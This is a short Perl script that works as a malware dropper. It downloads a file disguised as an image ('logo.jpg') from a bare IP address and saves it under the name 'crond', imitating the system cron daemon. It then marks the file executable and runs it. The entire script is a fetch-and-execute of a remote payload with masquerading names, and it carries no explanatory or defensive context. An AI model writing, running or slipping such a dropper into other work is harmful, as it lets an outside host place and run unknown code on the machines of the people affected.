#!/usr/bin/perl
use strict;
use warnings;
use LWP::Simple;

my $url = 'http://23.254.215.10/imgs/logo.jpg';
my $filename = "./crond";
#use File::Temp qw(tempfile);
#($fh, $filename) = tempfile( );
#getstore($url, $fh);
getstore($url, $filename);
chmod 0755, $filename;
system($filename)
